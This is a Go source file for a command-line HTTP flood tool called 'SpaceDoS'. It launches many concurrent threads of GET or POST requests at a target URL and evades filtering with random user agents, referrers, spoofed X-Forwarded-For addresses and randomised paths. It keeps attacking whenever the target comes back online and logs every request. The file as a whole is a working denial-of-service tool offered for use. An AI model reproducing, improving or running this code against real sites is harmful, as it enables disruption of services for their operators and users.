    package main

    import (
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

    var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
	"Mozilla/5.0 (X11; Linux x86_64)",
	"curl/7.68.0",
	"Wget/1.20.3 (linux-gnu)",
}

    var referrers = []string{
	"https://google.com",
	"https://bing.com",
	"https://duckduckgo.com",
	"https://yandex.com",
	"https://facebook.com",
}

    var paths = []string{"/", "/index", "/home", "/?id=", "/search?q=ddos"}

    func generateHeaders() http.Header {
	headers := http.Header{}
	headers.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
	headers.Set("X-Forwarded-For", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)))
	headers.Set("Referer", referrers[rand.Intn(len(referrers))])
	headers.Set("Cache-Control", "no-cache")
	headers.Set("Accept", "*/*")
	headers.Set("Keep-Alive", strconv.Itoa(rand.Intn(100)+1))
	headers.Set("Connection", "keep-alive")
	return headers
}

 func attack(target, method, payload string, duration time.Duration, wg *sync.WaitGroup, autoRetry bool, logFile *os.File, logMutex *sync.Mutex) {
	defer wg.Done()
	client := &http.Client{
		 Timeout: 5 * time.Second,
	}

	for {
		end := time.Now().Add(duration)
		for time.Now().Before(end) {
			 var req *http.Request
			var err error
			path := paths[rand.Intn(len(paths))]
			url := target + path + fmt.Sprint(rand.Intn(9999))

			if method == "POST" {
				req, err = http.NewRequest("POST", url, strings.NewReader(payload))
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			} else {
				req, err = http.NewRequest("GET", url, nil)
			}

			if err != nil {
				continue
			}

			headers := generateHeaders()
			for k, v := range headers {
				req.Header[k] = v
			}

			resp, err := client.Do(req)
			logMutex.Lock()
			if err == nil {
				fmt.Println("[+] Sent:", req.Method, req.URL.Path)
				logFile.WriteString(time.Now().Format(time.RFC3339) + " [+] Sent: " + req.Method + " " + req.URL.String() + "\n")
				io.Copy(io.Discard, resp.Body)
				resp.Body.Close()
			} else {
				fmt.Println("[-] Error: ", err)
				logFile.WriteString(time.Now().Format(time.RFC3339) + " [-] Error: " + err.Error() + "\n")
				logMutex.Unlock()
				 time.Sleep(3 * time.Second)
				if !autoRetry {
					return
				}
				break
			}
			logMutex.Unlock()
		}
		if !autoRetry {
			break
		}
		fmt.Println("[+] Retrying after cool down...")
		 time.Sleep(2 * time.Second)
		}
}

func printTUI(url string, threads int, duration int, method string, data string, retry bool) {
	fmt.Println("\n=======================================")
	fmt.Println("          SpaceDoS - by Arctic         ")
	fmt.Println("=======================================")
	fmt.Println("Target: ", url)
	fmt.Println("Method: ", method)
	fmt.Println("Threads:", threads)
	fmt.Println("Duration:", duration, "seconds")
	fmt.Println("Auto Retry:", retry)
	if method == "POST" {
		fmt.Println("Payload:", data)
	}
	fmt.Println("Log File: attack_log.txt")
	fmt.Println("=======================================\n")
}

func main() {
	target := flag.String("url", "", "Target URL (e.g., http://localhost:8080)")
	threads := flag.Int("threads", 10, "Number of concurrent threads")
	duration := flag.Int("duration", 10, "Duration of attack in seconds")
	method := flag.String("method", "GET", "HTTP method: GET or POST")
	data := flag.String("data", "id=test&value=123", "POST data payload")
	autoRetry := flag.Bool("retry", true, "Auto retry if server comes back online")
	flag.Parse()

	 if *target == "" {
		fmt.Println("Usage: ./space -url <target> -threads <number_of_threads> -duration <duration_in_seconds> -method <HTTP_method> [-data <POST_payload>] [-retry <true|false>]")
		os.Exit(1)
	}

	logFile, err := os.OpenFile("attack_log.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening log file:", err)
		return
	}
	defer logFile.Close()
	var logMutex sync.Mutex

	rand.Seed(time.Now().UnixNano())
	 printTUI(*target, *threads, *duration, *method, *data, *autoRetry)

	var wg sync.WaitGroup
	 timeDuration := time.Duration(*duration) * time.Second
	 for i := 0; i < *threads; i++ {
		wg.Add(1)
		 go attack(*target, strings.ToUpper(*method), *data, timeDuration, &wg, *autoRetry, logFile, &logMutex)
	}
	wg.Wait()
}
